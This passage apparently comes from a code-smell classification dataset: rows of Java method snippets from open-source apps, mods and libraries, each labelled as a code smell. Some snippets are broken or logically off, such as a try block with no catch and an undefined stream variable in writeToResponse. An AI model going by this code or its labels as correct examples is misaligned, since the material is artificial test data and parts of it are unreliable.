        childTask.setFile(file);
      }
      childTaskList.add(childTask);
    }
);
  }
  taskDetailVO.setChildTask(childTaskList);
  if (taskDetailVO.getWorkId() != null && taskDetailVO.getWorkId() != 0) {
    taskDetailVO.setAuthList(ApplicationContextHolder.getBean(IWorkService.class).auth(taskDetailVO.getWorkId()).getJSONObject(""work""));
  }
  setRelation(taskId,taskDetailVO);
  return taskDetailVO;
}",1,Code Smell
"public void sampleCenterDepth(){
  if ((hasFirstSample && (!everRetrieved)) || destroyed) {
    return;
  }
  hasFirstSample=true;
  this.framebuffer.bind();
  this.program.use();
  RenderSystem.viewport(0,0,1,1);
  FullScreenQuadRenderer.INSTANCE.render();
  ProgramUniforms.clearActiveUniforms();
  ProgramSamplers.clearActiveSamplers();
  DepthCopyStrategy.fastest(false).copy(this.framebuffer,texture,null,altTexture,1,1);
  Minecraft.getInstance().getMainRenderTarget().bindWrite(true);
}",1,Code Smell
"@Override public WFCMessage.PullMessageResult fetchChatroomMessage(String fromUser,String chatroomId,String exceptClientId,long fromMessageId){
  WFCMessage.PullMessageResult.Builder builder=WFCMessage.PullMessageResult.newBuilder();
  HazelcastInstance hzInstance=m_Server.getHazelcastInstance();
  IMap<Long,MessageBundle> mIMap=hzInstance.getMap(MESSAGES_MAP);
  long head=fromMessageId;
  long current=fromMessageId;
  TreeMap<Long,Long> maps=chatroomMessages.get(chatroomId);
  if (maps == null) {
    mWriteLock.lock();
    try {
      maps=chatroomMessages.get(chatroomId);
      if (maps == null) {
        maps=new TreeMap<>();
        chatroomMessages.put(chatroomId,maps);
      }
    }
  finally {
      mWriteLock.unlock();
    }
  }
  mReadLock.lock();
  int size=0;
  try {
    maps=chatroomMessages.get(chatroomId);
    while (true) {
      Map.Entry<Long,Long> entry=maps.higherEntry(current);
      if (entry == null) {
        break;
      }
      current=entry.getKey();
      long targetMessageId=entry.getValue();
      MessageBundle bundle=mIMap.get(targetMessageId);
      if (bundle != null) {
        if (exceptClientId == null || !exceptClientId.equals(bundle.getFromClientId()) || !fromUser.equals(bundle.getFromUser())) {
          if (bundle.getMessage().getContent().getExpireDuration() > 0) {
            if (System.currentTimeMillis() > bundle.getMessage().getServerTimestamp() + bundle.getMessage().getContent().getExpireDuration() * 1000) {
              continue;
            }
          }
          size+=bundle.getMessage().getSerializedSize();
          if (size >= 3 * 1024 * 1024) {
            break;
          }
          builder.addMessage(bundle.getMessage());
        }
      }
    }
    Map.Entry<Long,Long> lastEntry=maps.lastEntry();
    if (lastEntry != null) {
      head=lastEntry.getKey();
    }
  }
  finally {
    mReadLock.unlock();
  }
  builder.setCurrent(current);
  builder.setHead(head);
  return builder.build();
}",1,Code Smell
"@Override void onSelectedItemsCountChanged(int count){
  if (count <= 1 || parentAlert.editingMessageObject != null) {
    parentAlert.selectedMenuItem.hideSubItem(group);
    if (count == 0) {
      parentAlert.selectedMenuItem.showSubItem(open_in);
      parentAlert.selectedMenuItem.hideSubItem(compress);
    }
 else {
      parentAlert.selectedMenuItem.showSubItem(compress);
    }
  }
 else {
    parentAlert.selectedMenuItem.showSubItem(group);
  }
  if (count != 0) {
    parentAlert.selectedMenuItem.hideSubItem(open_in);
  }
  compressItem.setVisibility(documentsEnabled ? View.VISIBLE : View.GONE);
  if (count > 1) {
    parentAlert.selectedMenuItem.showSubItem(preview_gap);
    parentAlert.selectedMenuItem.showSubItem(preview);
    compressItem.setText(LocaleController.getString(R.string.SendAsFiles));
  }
 else {
    parentAlert.selectedMenuItem.hideSubItem(preview_gap);
    parentAlert.selectedMenuItem.hideSubItem(preview);
    if (count != 0) {
      compressItem.setText(LocaleController.getString(R.string.SendAsFile));
    }
  }
  if (count == 0 || parentAlert != null && parentAlert.baseFragment instanceof ChatActivity && ((ChatActivity)parentAlert.baseFragment).isSecretChat()) {
    spoilerItem.setText(LocaleController.getString(R.string.EnablePhotoSpoiler));
    spoilerItem.setAnimatedIcon(R.raw.photo_spoiler);
    parentAlert.selectedMenuItem.hideSubItem(spoiler);
  }
 else {
    parentAlert.selectedMenuItem.showSubItem(spoiler);
  }
}",1,Code Smell
"public void processClass(ClassNode root,ClassNode node){
  if (node.type == ClassNode.CLASS_LAMBDA && !node.lambdaInformation.is_method_reference) {
    ClassNode node_content=DecompilerContext.getClassProcessor().getMapRootClasses().get(node.classStruct.qualifiedName);
    if (node_content != null && node_content.getWrapper() != null) {
      node_content.getWrapper().getHiddenMembers().add(node.lambdaInformation.content_method_key);
    }
  }
  if (node.nested.isEmpty()) {
    return;
  }
  if (node.type != ClassNode.CLASS_LAMBDA) {
    computeLocalVarsAndDefinitions(node);
    checkNotFoundClasses(root,node);
  }
  int nameless=0, synthetics=0;
  for (  ClassNode child : node.nested) {
    StructClass cl=child.classStruct;
    if ((child.type == ClassNode.CLASS_LOCAL || child.type == ClassNode.CLASS_MEMBER) && child.simpleName == null) {
      if ((child.access & CodeConstants.ACC_SYNTHETIC) != 0 || cl.isSynthetic()) {
        child.simpleName=""SyntheticClass_"" + (++synthetics);
      }
 else {
        String message=""Nameless local or member class "" + cl.qualifiedName + ""!"";
        DecompilerContext.getLogger().writeMessage(message,IFernflowerLogger.Severity.WARN);
        child.simpleName=""NamelessClass_"" + (++nameless);
      }
    }
  }
  for (  ClassNode child : node.nested) {
    if (child.type == ClassNode.CLASS_LAMBDA) {
      setLambdaVars(node,child);
    }
 else     if (child.type != ClassNode.CLASS_MEMBER || (child.access & CodeConstants.ACC_STATIC) == 0) {
      insertLocalVars(node,child);
      if (child.type == ClassNode.CLASS_LOCAL && child.enclosingMethod != null) {
        MethodWrapper enclosingMethodWrapper=node.getWrapper().getMethods().getWithKey(child.enclosingMethod);
        if (enclosingMethodWrapper != null) {
          setLocalClassDefinition(enclosingMethodWrapper,child);
        }
      }
    }
  }
  for (  ClassNode child : node.nested) {
    processClass(root,child);
  }
}",1,Code Smell
"private void addCameraItemIfNeeded(List<BottomItemData> itemDataList){
  if (isSeatEnabled() && mConferenceState.userModel.getRole() == TUIRoomDefine.Role.GENERAL_USER && !mConferenceState.userModel.isOnSeat()) {
    return;
  }
  itemDataList.add(createCameraItem());
}
",1,Code Smell
"@OnlyIn(Dist.CLIENT) protected void tickAudio(WhistleSize size,boolean powered){
  if (!powered) {
    if (soundInstance != null) {
      soundInstance.fadeOut();
      soundInstance=null;
    }
    return;
  }
  float f=(float)Math.pow(2,-pitch / 12.0);
  boolean particle=level.getGameTime() % 8 == 0;
  Vec3 eyePosition=Minecraft.getInstance().cameraEntity.getEyePosition();
  float maxVolume=(float)Mth.clamp((64 - eyePosition.distanceTo(Vec3.atCenterOf(worldPosition))) / 64,0,1);
  if (soundInstance == null || soundInstance.isStopped() || soundInstance.getOctave() != size) {
    Minecraft.getInstance().getSoundManager().play(soundInstance=new WhistleSoundInstance(size,worldPosition));
    AllSoundEvents.WHISTLE_CHIFF.playAt(level,worldPosition,maxVolume * .175f,size == WhistleSize.SMALL ? f + .75f : f,false);
    particle=true;
  }
  soundInstance.keepAlive();
  soundInstance.setPitch(f);
  if (!particle)   return;
  Direction facing=getBlockState().getOptionalValue(WhistleBlock.FACING).orElse(Direction.SOUTH);
  float angle=180 + AngleHelper.horizontalAngle(facing);
  Vec3 sizeOffset=VecHelper.rotate(new Vec3(0,-0.4f,1 / 16f * size.ordinal()),angle,Axis.Y);
  Vec3 offset=VecHelper.rotate(new Vec3(0,1,0.75f),angle,Axis.Y);
  Vec3 v=offset.scale(.45f).add(sizeOffset).add(Vec3.atCenterOf(worldPosition));
  Vec3 m=offset.subtract(Vec3.atLowerCornerOf(facing.getNormal()).scale(.75f));
  level.addParticle(new SteamJetParticleData(1),v.x,v.y,v.z,m.x,m.y,m.z);
}",1,Code Smell
"private View.OnClickListener getMessageClickListener(final Wrapper<MESSAGE> wrapper){
  return new DebouncedOnClickListener(3_000){
    @Override public void onDebouncedClick(    View view){
      if (selectionListener != null && isSelectionModeEnabled) {
        wrapper.isSelected=!wrapper.isSelected;
        if (wrapper.isSelected)         incrementSelectedItemsCount();
 else         decrementSelectedItemsCount();
        MESSAGE message=(wrapper.item);
        notifyItemChanged(getMessagePositionById(message.getId()));
      }
 else {
        notifyMessageClicked(wrapper.item);
        notifyMessageViewClicked(view,wrapper.item);
      }
    }
  }
;
}",1,Code Smell
"public boolean isOutOwner(){
  if (preview) {
    return true;
  }
  if (isOutOwnerCached != null) {
    return isOutOwnerCached;
  }
  TLRPC.Chat chat=messageOwner.peer_id != null && messageOwner.peer_id.channel_id != 0 ? getChat(null,null,messageOwner.peer_id.channel_id) : null;
  if (!messageOwner.out || !(messageOwner.from_id instanceof TLRPC.TL_peerUser) && (!(messageOwner.from_id instanceof TLRPC.TL_peerChannel) || ChatObject.isChannel(chat) && !chat.megagroup) || messageOwner.post) {
    return isOutOwnerCached=false;
  }
  if (messageOwner.fwd_from == null) {
    return isOutOwnerCached=true;
  }
  long selfUserId=UserConfig.getInstance(currentAccount).getClientUserId();
  if (getDialogId() == selfUserId) {
    return isOutOwnerCached=messageOwner.fwd_from.from_id instanceof TLRPC.TL_peerUser && messageOwner.fwd_from.from_id.user_id == selfUserId && (messageOwner.fwd_from.saved_from_peer == null || messageOwner.fwd_from.saved_from_peer.user_id == selfUserId) || messageOwner.fwd_from.saved_from_peer != null && messageOwner.fwd_from.saved_from_peer.user_id == selfUserId && (messageOwner.fwd_from.from_id == null || messageOwner.fwd_from.from_id.user_id == selfUserId);
  }
  return isOutOwnerCached=messageOwner.fwd_from.saved_from_peer == null || messageOwner.fwd_from.saved_from_peer.user_id == selfUserId;
}",1,Code Smell
"@Override public J.ParameterizedType visitParameterizedType(J.ParameterizedType type,P p){
  J.ParameterizedType pt=super.visitParameterizedType(type,p);
  boolean spaceWithinAngleBrackets=style.getWithin().getAngleBrackets();
  if (pt.getPadding().getTypeParameters() != null) {
    pt=pt.getPadding().withTypeParameters(spaceBefore(pt.getPadding().getTypeParameters(),style.getTypeArguments().getBeforeOpeningAngleBracket()));
  }
  if (pt.getPadding().getTypeParameters() != null && !(pt.getPadding().getTypeParameters().getElements().isEmpty() || pt.getPadding().getTypeParameters().getElements().iterator().next() instanceof J.Empty)) {
    int typeParametersSize=pt.getPadding().getTypeParameters().getElements().size();
    pt=pt.getPadding().withTypeParameters(pt.getPadding().getTypeParameters().getPadding().withElements(ListUtils.map(pt.getPadding().getTypeParameters().getPadding().getElements(),(index,elemContainer) -> {
      if (index == 0) {
        elemContainer=elemContainer.withElement(spaceBefore(elemContainer.getElement(),spaceWithinAngleBrackets));
      }
 else {
        elemContainer=elemContainer.withElement(spaceBefore(elemContainer.getElement(),style.getTypeArguments().getAfterComma()));
      }
      if (index == typeParametersSize - 1) {
        elemContainer=spaceAfter(elemContainer,spaceWithinAngleBrackets);
      }
      return elemContainer;
    }
)));
  }
  return pt;
}",1,Code Smell
"public static String replaceDateExpression(Calendar dateTime,String dataPath){
  if (dataPath == null) {
    return null;
  }
  String year=String.valueOf(dateTime.get(Calendar.YEAR));
  String month=String.valueOf(dateTime.get(Calendar.MONTH) + 1);
  String day=String.valueOf(dateTime.get(Calendar.DAY_OF_MONTH));
  String hour=String.valueOf(dateTime.get(Calendar.HOUR_OF_DAY));
  String minute=String.valueOf(dateTime.get(Calendar.MINUTE));
  StringBuffer sb=new StringBuffer();
  ArrayList<MatchPoint> mp=extractAllTimeRegex(dataPath);
  if (mp == null || mp.size() == 0) {
    return dataPath;
  }
  int lastIndex=0;
  for (  MatchPoint m : mp) {
    sb.append(dataPath.substring(lastIndex,m.getStart()));
    String longestPattern=m.getStr();
    int hhIndex=longestPattern.indexOf(""hh"");
    int mmIndex=longestPattern.indexOf(""mm"");
    longestPattern=longestPattern.replaceAll(""YYYY"",year);
    longestPattern=longestPattern.replaceAll(""MM"",externDate(month));
    longestPattern=longestPattern.replaceAll(""DD"",externDate(day));
    longestPattern=longestPattern.replaceAll(""hh"",externDate(hour));
    if (hhIndex != -1 && mmIndex != -1 && mmIndex >= hhIndex + 2 && mmIndex < hhIndex + 4) {
      longestPattern=longestPattern.replaceAll(""mm"",externDate(minute));
    }
    sb.append(longestPattern);
    lastIndex=m.getEnd();
  }
  sb.append(dataPath.substring(lastIndex));
  return sb.toString();
}",1,Code Smell
"/** 
 * Sends telemetry information.
 * @param engine the default engine name
 */
public static void callHome(String engine){
  if (Utils.isOfflineMode() || Boolean.parseBoolean(Utils.getEnvOrSystemProperty(""OPT_OUT_TRACKING"")) || System.currentTimeMillis() - lastCheckIn < ONE_DAY) {
    return;
  }
  lastCheckIn=System.currentTimeMillis();
  String instanceId;
  String region;
  if (isSageMaker()) {
    instanceId=readEndpointMetadata(""ResourceId"");
    region=Utils.getenv(""AWS_REGION"");
  }
 else {
    instanceId=readMetadata(""instance-id"");
    region=readMetadata(""placement/region"");
  }
  if (instanceId == null || region == null || region.length() == 0) {
    return;
  }
  String url=""https://djl-telemetry-"" + region + "".s3.""+ region+ "".amazonaws.com/telemetry.txt?instance-id=""+ instanceId+ ""&version=""+ Engine.getDjlVersion()+ ""&engine=""+ engine;
  HttpURLConnection conn=null;
  try {
    conn=openConnection(new URL(url),""GET"",null,null);
    int statusCode=conn.getResponseCode();
    if (statusCode != HttpURLConnection.HTTP_OK) {
      logger.debug(""telemetry: {} {}"",statusCode,conn.getResponseMessage());
    }
 else {
      logger.info(""DJL will collect telemetry to help us better understand our users' needs,"" + "" diagnose issues, and deliver additional features. If you would like"" + "" to learn more or opt-out please go to:""+ "" https://docs.djl.ai/master/docs/telemetry.html for more""+ "" information."");
    }
  }
 catch (  IOException e) {
    logger.debug(""Failed call home."");
  }
 finally {
    if (conn != null) {
      conn.disconnect();
    }
  }
}",1,Code Smell
"/** 
 * 画底部文字
 * @param canvas
 * @param startX
 * @param endX
 * @param lineStartY
 * @param bottomTextPadding
 */
private void drawBottomText(@NonNull Canvas canvas,int startX,int endX,int lineStartY,float bottomTextPadding){
  if (textLayout != null) {
    if (tempErrorText != null || ((helperTextAlwaysShown || hasFocus()) && !TextUtils.isEmpty(helperText))) {
      textPaint.setColor(tempErrorText != null ? errorColor : helperTextColor != -1 ? helperTextColor : (baseColor & 0x00ffffff | 0x44000000));
      canvas.save();
      if (isRTL()) {
        canvas.translate(endX - textLayout.getWidth(),lineStartY + bottomSpacing - bottomTextPadding);
      }
 else {
        canvas.translate(startX + getBottomTextLeftOffset(),lineStartY + bottomSpacing - bottomTextPadding);
      }
      textLayout.draw(canvas);
      canvas.restore();
    }
  }
}",1,Code Smell
"@Override public J visitLambda(J.Lambda lambda,P ctx){
  J.Lambda l=(J.Lambda)super.visitLambda(lambda,ctx);
  if (getStyle().getLambda() && l.getParameters().getParameters().size() == 1 && l.getParameters().isParenthesized() && l.getParameters().getParameters().get(0) instanceof J.VariableDeclarations && ((J.VariableDeclarations)l.getParameters().getParameters().get(0)).getTypeExpression() == null) {
    l=l.withParameters(l.getParameters().withParenthesized(false));
  }
  return l;
}",1,Code Smell
"@NonNull @Override protected InteractionResult mobInteract(@NonNull Hand hand,@NonNull GeyserItemStack itemInHand){
  if (!canEat(itemInHand) && getFlag(EntityFlag.SADDLED) && passengers.isEmpty()&& !session.isSneaking()) {
    return InteractionResult.SUCCESS;
  }
 else {
    InteractionResult superResult=super.mobInteract(hand,itemInHand);
    if (superResult.consumesAction()) {
      return superResult;
    }
 else {
      return EntityUtils.attemptToSaddle(this,itemInHand);
    }
  }
}
",1,Code Smell
"@Override public void open(MetricConfig config){
  super.open(config);
  String host=config.getString(HOST.key(),HOST.defaultValue());
  int port=config.getInteger(PORT.key(),PORT.defaultValue());
  String clusterMode=config.getString(CLUSTER_MODE.key(),CLUSTER_MODE.defaultValue());
  String configuredJobName=config.getString(JOB_NAME.key(),JOB_NAME.defaultValue());
  boolean randomSuffix=config.getBoolean(RANDOM_JOB_NAME_SUFFIX.key(),RANDOM_JOB_NAME_SUFFIX.defaultValue());
  deleteOnShutdown=config.getBoolean(DELETE_ON_SHUTDOWN.key(),DELETE_ON_SHUTDOWN.defaultValue());
  groupingKey=parseGroupingKey(config.getString(GROUPING_KEY.key(),GROUPING_KEY.defaultValue()));
  if (host == null || host.isEmpty() || port < 1) {
    throw new IllegalArgumentException(""Invalid host/port configuration. Host: "" + host + "" Port: ""+ port);
  }
  Properties properties=System.getProperties();
  taskName=properties.getProperty(""taskName"",null);
  taskId=properties.getProperty(""taskId"",null);
  String jobNamePrefix="""";
  if (!StringUtils.isNullOrWhitespaceOnly(clusterMode) && clusterMode.toUpperCase().equals(ClusterMode.YARN.name())) {
    appId=System.getenv(""_APP_ID"");
    if (!StringUtils.isNullOrWhitespaceOnly(appId)) {
      jobNamePrefix=appId + ""_jobmanager"";
    }
 else {
      String pwd=System.getenv(""PWD"");
      String[] values=pwd.split(File.separator);
      String containerId="""";
      if (values.length >= 2) {
        appId=values[values.length - 2];
        containerId=values[values.length - 1];
      }
      jobNamePrefix=appId + ""_taskmanager_"" + containerId;
    }
  }
 else   if (!StringUtils.isNullOrWhitespaceOnly(clusterMode) && clusterMode.toUpperCase().equals(ClusterMode.K8S.name())) {
    Map<String,String> envs=System.getenv();
    appId=envs.get(""CLUSTER_ID"");
    if (""k8s"".equalsIgnoreCase(host)) {
      host=envs.get(""_HOST_IP_ADDRESS"");
      log.info(""the pod is on K8s cluster, the host ip is {}"",host);
    }
    if (appId != null) {
      String hostname=envs.get(""HOSTNAME"");
      if (hostname.contains(""taskmanager"")) {
        jobNamePrefix=appId + ""_taskmanager_"" + hostname;
      }
 else {
        jobNamePrefix=appId + ""_jobmanager"";
      }
    }
  }
 else {
    jobNamePrefix=configuredJobName;
  }
  if (randomSuffix) {
    this.jobName=jobNamePrefix + ""_"" + new AbstractID();
  }
 else {
    this.jobName=jobNamePrefix;
  }
  pushGateway=new PushGateway(host + ':' + port);
  log.info(""Configured PrometheusPushGatewayReporter with {host:{}, port:{}, jobName:{}, randomJobNameSuffix:{}, deleteOnShutdown:{}, groupingKey:{}}"",host,port,jobName,randomSuffix,deleteOnShutdown,groupingKey);
}",1,Code Smell
"/** 
 * Appends a sequence of items to the media queue. If no media queue exists, does nothing.
 * @param items The items to append.
 * @return The Cast {@code PendingResult}, or null if no media queue exists.
 */
@Nullable public PendingResult<MediaChannelResult> addItems(MediaQueueItem... items){
  return addItems(MediaQueueItem.INVALID_ITEM_ID,items);
}
/** 
 * Inserts a sequence of items into the media queue. If no media queue or period with id  {@code periodId} exist, does nothing.
 * @param periodId The id of the period ({@link #getCurrentTimeline}) that corresponds to the item that will follow immediately after the inserted items.
 * @param items The items to insert.
 * @return The Cast {@code PendingResult}, or null if no media queue or no period with id  {@code periodId} exist.
 */
@Nullable public PendingResult<MediaChannelResult> addItems(int periodId,MediaQueueItem... items){
  if (getMediaStatus() != null && (periodId == MediaQueueItem.INVALID_ITEM_ID || currentTimeline.getIndexOfPeriod(periodId) != C.INDEX_UNSET)) {
    return remoteMediaClient.queueInsertItems(items,periodId,null);
  }
  return null;
}
",1,Code Smell
"public void setLabelOrientation(View view,int orientation){
  if (mOrientation != orientation && orientation <= RIGHT_BOTTOM && orientation >= LEFT_TOP) {
    mOrientation=orientation;
    view.invalidate();
  }
}
",1,Code Smell
"@Override protected PluginDescriptor createPluginDescriptor(Manifest manifest){
  JdbcDriverPluginDescriptor pluginDescriptor=this.createJdbcDriverPluginDescriptorInstance();
  Attributes attributes=manifest.getMainAttributes();
  String id=driverClass;
  pluginDescriptor.setPluginId(id.split(""\n"")[0]);
  if (StringUtils.isBlank(id)) {
    return null;
  }
  String description=attributes.getValue(""Plugin-Description"");
  if (StringUtils.isBlank(description)) {
    pluginDescriptor.setPluginDescription("""");
  }
 else {
    pluginDescriptor.setPluginDescription(description);
  }
  String version=attributes.getValue(""Implementation-Version"");
  if (StringUtils.isNotBlank(version)) {
    pluginDescriptor.setPluginVersion(version);
  }
 else {
    for (    Object key : attributes.keySet()) {
      Object var=attributes.get(key);
      if (key != null && var != null && StringUtils.containsIgnoreCase(key.toString(),""Version"")) {
        pluginDescriptor.setPluginVersion(var.toString());
        break;
      }
    }
  }
  if (StringUtils.isBlank(version)) {
    pluginDescriptor.setPluginVersion(id);
  }
  String provider=attributes.getValue(""Implementation-Vendor"");
  pluginDescriptor.setProvider(provider);
  return pluginDescriptor;
}",1,Code Smell
"@Override public T get(int position){
  if (mItems != null && position >= 0 && position <= mItems.size() - 1) {
    return mItems.get(position);
  }
 else {
    return null;
  }
}",1,Code Smell
"public static void reloadDebugState(){
  if (Iris.getIrisConfig().areDebugOptionsEnabled() && (GL.getCapabilities().GL_KHR_debug || GL.getCapabilities().OpenGL43)) {
    debugState=new KHRDebugState();
  }
 else {
    debugState=new UnsupportedDebugState();
  }
}",1,Code Smell
"@Override public <T>LazyOptional<T> getCapability(Capability<T> cap,Direction side){
  if (isFluidHandlerCap(cap) && (side == null || HosePulleyBlock.hasPipeTowards(level,worldPosition,getBlockState(),side)))   return this.capability.cast();
  return super.getCapability(cap,side);
}
",1,Code Smell
"@Override public boolean onInterceptTouchEvent(final MotionEvent me){
  if (isInlineAutofillSuggestionsVisible) {
    return false;
  }
  if (!mMoreSuggestionsView.isShowingInParent()) {
    mLastX=(int)me.getX();
    mLastY=(int)me.getY();
    return mMoreSuggestionsSlidingDetector.onTouchEvent(me);
  }
  if (mMoreSuggestionsView.isInModalMode()) {
    return false;
  }
  final int action=me.getAction();
  final int index=me.getActionIndex();
  final int x=(int)me.getX(index);
  final int y=(int)me.getY(index);
  if (Math.abs(x - mOriginX) >= mMoreSuggestionsModalTolerance || mOriginY - y >= mMoreSuggestionsModalTolerance) {
    mNeedsToTransformTouchEventToHoverEvent=AccessibilityUtils.Companion.getInstance().isTouchExplorationEnabled();
    mIsDispatchingHoverEventToMoreSuggestions=false;
    return true;
  }
  if (action == MotionEvent.ACTION_UP || action == MotionEvent.ACTION_POINTER_UP) {
    mMoreSuggestionsView.setModalMode();
  }
  return false;
}
",1,Code Smell
"private SpelNodeImpl eatStartNode(){
  if (maybeEatLiteral()) {
    return pop();
  }
 else   if (maybeEatParenExpression()) {
    return pop();
  }
 else   if (maybeEatTypeReference() || maybeEatNullReference() || maybeEatConstructorReference()|| maybeEatMethodOrProperty(false)|| maybeEatFunctionOrVar()) {
    return pop();
  }
 else   if (maybeEatBeanReference()) {
    return pop();
  }
 else   if (maybeEatProjection(false) || maybeEatSelection(false) || maybeEatIndexer()) {
    return pop();
  }
 else   if (maybeEatInlineListOrMap()) {
    return pop();
  }
 else {
    return null;
  }
}
",1,Code Smell
"private static void liftConstructor(ClassWrapper wrapper){
  for (  MethodWrapper method : wrapper.getMethods()) {
    if (CodeConstants.INIT_NAME.equals(method.methodStruct.getName()) && method.root != null) {
      Statement firstData=Statements.findFirstData(method.root);
      if (firstData == null) {
        return;
      }
      int index=0;
      List<Exprent> lstExprents=firstData.getExprents();
      for (      Exprent exprent : lstExprents) {
        int action=0;
        if (exprent.type == Exprent.EXPRENT_ASSIGNMENT) {
          AssignmentExprent assignExpr=(AssignmentExprent)exprent;
          if (assignExpr.getLeft().type == Exprent.EXPRENT_FIELD && assignExpr.getRight().type == Exprent.EXPRENT_VAR) {
            FieldExprent fExpr=(FieldExprent)assignExpr.getLeft();
            if (fExpr.getClassname().equals(wrapper.getClassStruct().qualifiedName)) {
              StructField structField=wrapper.getClassStruct().getField(fExpr.getName(),fExpr.getDescriptor().descriptorString);
              if (structField != null && structField.hasModifier(CodeConstants.ACC_FINAL)) {
                action=1;
              }
            }
          }
        }
 else         if (index > 0 && exprent.type == Exprent.EXPRENT_INVOCATION && Statements.isInvocationInitConstructor((InvocationExprent)exprent,method,wrapper,true)) {
          lstExprents.add(0,lstExprents.remove(index));
          action=2;
        }
        if (action != 1) {
          break;
        }
        index++;
      }
    }
  }
}",1,Code Smell
"private void writeToResponse(CompressedInputStream data,HttpResponse response,HttpRequest request) throws IOException {
  Compression compression=data.getCompression();
  if (compression != Compression.NONE && request.hasHeaderValue(""Accept-Encoding"",compression.getId())) {
    response.addHeader(""Content-Encoding"",compression.getId());
    response.setData(data);
  }
 else   if (compression != Compression.GZIP && !response.hasHeaderValue(""Content-Type"",""image/png"") && request.hasHeaderValue(""Accept-Encoding"",Compression.GZIP.getId())) {
    response.addHeader(""Content-Encoding"",Compression.GZIP.getId());
    ByteArrayOutputStream byteOut=new ByteArrayOutputStream();
    try {
      data.decompress().transferTo(os);
    }
     byte[] compressedData=byteOut.toByteArray();
    response.setData(new ByteArrayInputStream(compressedData));
  }
 else {
    response.setData(data.decompress());
  }
}
",1,Code Smell
"@Nullable private static SchemeData parseDrmSchemeData(String line,String keyFormat,Map<String,String> variableDefinitions) throws ParserException {
  String keyFormatVersions=parseOptionalStringAttr(line,REGEX_KEYFORMATVERSIONS,""1"",variableDefinitions);
  if (KEYFORMAT_WIDEVINE_PSSH_BINARY.equals(keyFormat)) {
    String uriString=parseStringAttr(line,REGEX_URI,variableDefinitions);
    return new SchemeData(C.WIDEVINE_UUID,MimeTypes.VIDEO_MP4,Base64.decode(uriString.substring(uriString.indexOf(',')),Base64.DEFAULT));
  }
 else   if (KEYFORMAT_WIDEVINE_PSSH_JSON.equals(keyFormat)) {
    return new SchemeData(C.WIDEVINE_UUID,""hls"",Util.getUtf8Bytes(line));
  }
 else   if (KEYFORMAT_PLAYREADY.equals(keyFormat) && ""1"".equals(keyFormatVersions)) {
    String uriString=parseStringAttr(line,REGEX_URI,variableDefinitions);
    byte[] data=Base64.decode(uriString.substring(uriString.indexOf(',')),Base64.DEFAULT);
    byte[] psshData=PsshAtomUtil.buildPsshAtom(C.PLAYREADY_UUID,data);
    return new SchemeData(C.PLAYREADY_UUID,MimeTypes.VIDEO_MP4,psshData);
  }
  return null;
}",1,Code Smell
"@Override public BlockState getStateForPlacement(BlockPlaceContext context){
  Axis preferredAxis=RotatedPillarKineticBlock.getPreferredAxis(context);
  if (preferredAxis != null && (context.getPlayer() == null || !context.getPlayer().isShiftKeyDown()))   return withAxis(preferredAxis,context);
  return withAxis(context.getNearestLookingDirection().getAxis(),context);
}
",1,Code Smell
"public static boolean isOpenEnd(BlockGetter reader,BlockPos pos,Direction side){
  BlockPos connectedPos=pos.relative(side);
  BlockState connectedState=reader.getBlockState(connectedPos);
  FluidTransportBehaviour pipe=FluidPropagator.getPipe(reader,connectedPos);
  if (pipe != null && pipe.canHaveFlowToward(connectedState,side.getOpposite()))   return false;
  if (PumpBlock.isPump(connectedState) && connectedState.getValue(PumpBlock.FACING).getAxis() == side.getAxis())   return false;
  if (VanillaFluidTargets.canProvideFluidWithoutCapability(connectedState))   return true;
  if (BlockHelper.hasBlockSolidSide(connectedState,reader,connectedPos,side.getOpposite()) && !AllBlockTags.FAN_TRANSPARENT.matches(connectedState))   return false;
  if (hasFluidCapability(reader,connectedPos,side.getOpposite()))   return false;
  if (!(connectedState.canBeReplaced() && connectedState.getDestroySpeed(reader,connectedPos) != -1) && !connectedState.hasProperty(BlockStateProperties.WATERLOGGED))   return false;
  return true;
}",1,Code Smell
"@Override protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
  try {
    if (!allScreenRotations)     return;
    final int lastRotation=(int)param.args[1];
    if (getIntField(param.thisObject,""mUserRotationMode"") == USER_ROTATION_LOCKED) {
      param.setResult(lastRotation);
      return;
    }
    Object mOrientationListener=getObjectField(param.thisObject,""mOrientationListener"");
    int sensorRotation=mOrientationListener != null ? (int)callMethod(mOrientationListener,""getProposedRotation"") : -1;
    if (sensorRotation < 0) {
      sensorRotation=lastRotation;
    }
    param.setResult(sensorRotation);
  }
 catch (  Throwable ignored) {
  }
}",1,Code Smell
"private void execute(ArrayList<Runnable> runnables){
  for (int i=0; i < runnables.size(); i++) {
    Runnable runnable=runnables.get(i);
    if (runnable == null) {
      continue;
    }
    DispatchQueue queue;
    if (!busyQueues.isEmpty() && (totalTasksCount / 2 <= busyQueues.size() || queues.isEmpty() && createdCount >= maxCount)) {
      queue=busyQueues.remove(0);
    }
 else     if (queues.isEmpty()) {
      queue=new DispatchQueue(THREAD_PREFIX + guid + ""_""+ Utilities.random.nextInt());
      queue.setPriority(Thread.MAX_PRIORITY);
      createdCount++;
    }
 else {
      queue=queues.remove(0);
    }
    if (!cleanupScheduled) {
      Utilities.globalQueue.postRunnable(cleanupRunnable,30000);
      cleanupScheduled=true;
    }
    totalTasksCount++;
    busyQueues.add(queue);
    int count=busyQueuesMap.get(queue.index,0);
    busyQueuesMap.put(queue.index,count + 1);
    queue.postRunnable(() -> {
      runnable.run();
      Utilities.globalQueue.postRunnable(() -> {
        totalTasksCount--;
        int remainingTasksCount=busyQueuesMap.get(queue.index) - 1;
        if (remainingTasksCount == 0) {
          busyQueuesMap.delete(queue.index);
          busyQueues.remove(queue);
          queues.add(queue);
        }
 else {
          busyQueuesMap.put(queue.index,remainingTasksCount);
        }
      }
);
    }
);
  }
}
@UiThread public static void execute(Runnable runnable){
  execute(runnable,false);
}
@UiThread public static void execute(Runnable runnable,boolean now){
  if (Thread.currentThread() != ApplicationLoader.applicationHandler.getLooper().getThread()) {
    if (BuildVars.DEBUG_VERSION) {
      FileLog.e(new RuntimeException(""wrong thread""));
    }
    return;
  }
  if (updateTaskCollection == null) {
    if (!freeCollections.isEmpty()) {
      updateTaskCollection=freeCollections.remove(freeCollections.size() - 1);
    }
 else {
      updateTaskCollection=new ArrayList<>(100);
    }
    if (!now) {
      AndroidUtilities.runOnUIThread(finishCollectUpdateRunnable);
    }
  }
  updateTaskCollection.add(runnable);
  if (now) {
    AndroidUtilities.cancelRunOnUIThread(finishCollectUpdateRunnable);
    finishCollectUpdateRunnable.run();
  }
}",1,Code Smell
"@Test public void testSelect(){
  tester.check(""select * from (values(1))"",SqlTests.INTEGER_TYPE_CHECKER,""1"",0);
